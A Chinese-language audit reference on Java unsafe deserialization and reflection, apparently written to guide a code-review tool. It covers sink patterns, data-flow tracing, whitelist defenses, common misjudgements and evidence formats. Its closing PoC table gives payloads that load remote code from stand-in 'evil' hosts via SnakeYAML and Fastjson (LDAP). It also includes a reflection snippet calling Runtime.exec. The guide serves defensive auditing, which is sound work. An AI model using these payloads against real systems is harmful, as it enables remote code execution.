# Deserialization & Reflection Family（Unsafe Deserialization / Unsafe Reflection）

## 共性

反序列化和反射本质是"**对象图重建**" / "**动态类加载与方法调用**"。当输入流可控时，
攻击者可注入 gadget chain 触发任意代码执行（RCE）。

## sink 模式速查

### Unsafe Deserialization
- `ObjectInputStream.readObject()` / `readUnshared()` (JDK 原生)
- `XMLDecoder.readObject()` (XML 反序列化)
- `XStream.fromXML($XML)` —— **默认配置就不安全**，必须显式 `addPermission(...)` + `denyTypes(...)` 白名单
- `Kryo.readObject(...)` / `readClassAndObject(...)` —— **默认不安全**，必须 `setRegistrationRequired(true)`
- `SnakeYAML.load($YAML)` / `new Yaml().load(...)` —— **默认不安全**，必须用 `SafeConstructor`
- `Fastjson` `JSON.parseObject($JSON, Object.class)` 或 `enableAutoType()` —— 历史 CVE 多
- `Jackson` `enableDefaultTyping()` —— 历史 CVE 多（CVE-2019-12384 等）
- `Hessian.HessianInput.readObject()`

### Unsafe Reflection
- `Class.forName($NAME)` —— $NAME 用户可控
- `ClassLoader.loadClass($NAME)`
- `Class.getMethod($METHOD, ...).invoke(...)` —— $METHOD 用户可控
- `Constructor.newInstance(...)` 后跟用户可控的 setter 调用
- 动态代理 `Proxy.newProxyInstance(cl, intfs, $HANDLER)`

## 数据流追溯重点

1. **找 readObject / fromXML / load / parseObject 等 sink 调用**；
2. 看输入参数（`InputStream` / `String` / `byte[]`）的来源：
   - `request.getInputStream()` / `@RequestBody byte[] body` / `@RequestParam String token`
   - Kafka 消费、MQ 消息、文件上传内容
3. 任一输入可控 → 立即 VULNERABLE（反序列化没有"过滤"概念，只有"白名单"）。

## 防御机制速查

### Deserialization
- **白名单类型** ——
  - `ObjectInputStream` 必须重写 `resolveClass()` 拒绝非白名单类
  - `XStream`: `xstream.addPermission(NoTypePermission.NONE); xstream.allowTypes(new Class[]{...})`
  - `Kryo`: `kryo.setRegistrationRequired(true); kryo.register(AllowedClass.class)`
  - `Jackson`: 用 `PolymorphicTypeValidator` 限制 polymorphic 类型
- **数据格式替换** —— 内部 RPC 用 Protobuf / Avro / FlatBuffers（无 gadget 攻击面）
- **签名验证** —— 反序列化前先验证 HMAC / 数字签名，拒绝任何未签名的数据

### Reflection
- 类名白名单：`if (!ALLOWED_CLASSES.contains(className)) throw new ...`
- SecurityManager 限制 `accessDeclaredMembers` / `setAccessible` 权限（JDK 17 起 SM 弃用，改用 Module 系统）

## 常见误判

- ❌ "代码里有 try/catch 包了 ClassNotFoundException" —— 不是过滤，gadget 类一般是已存在的常用库类
- ❌ "用了 XStream 就是安全的" —— XStream **默认不安全**，必须看到 `addPermission` 才算
- ❌ "数据来自数据库不是 HTTP" —— 数据库内容仍可能被先前的 SQL Injection 写入
- ❌ "教学项目" 借口

## 证据引用范例

**DEFENDED 时**：
```
defense_analysis: "Line 42 ObjectInputStream ois = new SafeObjectInputStream(input);
                  SafeObjectInputStream 在 SafeOIS.java:18 重写 resolveClass 仅允许
                  com.example.dto.* 包,拒绝其他类型抛 InvalidClassException."
```

**VULNERABLE 时**：
```
suspicion_reason: "Line 23 ObjectInputStream ois = new ObjectInputStream(
                   new ByteArrayInputStream(Base64.getDecoder().decode(token)));
                  Line 24 Object o = ois.readObject();
                  — token 来自 @PostMapping /InsecureDeserialization/task 的请求体,
                  100% 用户可控,JDK 原生 OIS 无白名单,可注入 ysoserial gadget RCE."
```

## PoC 模板

| 反序列化框架 | poc_payload 思路 |
|---|---|
| JDK ObjectInputStream | 用 ysoserial 生成 CommonsCollections1 / CommonsBeanutils1 / Spring1 等 gadget |
| XStream | `<sorted-set><string>...</string><dynamic-proxy>...</dynamic-proxy></sorted-set>` |
| SnakeYAML | `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil/"]]]]` |
| Fastjson | `{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://evil/x"}` |
| Jackson DefaultTyping | `["org.apache.xalan.xsltc.trax.TemplatesImpl", {...gadget...}]` |

### Unsafe Reflection PoC
```java
// 攻击者输入 className="java.lang.Runtime"
Class<?> cls = Class.forName(className);
cls.getMethod("exec", String.class).invoke(cls.getMethod("getRuntime").invoke(null), "id");
```
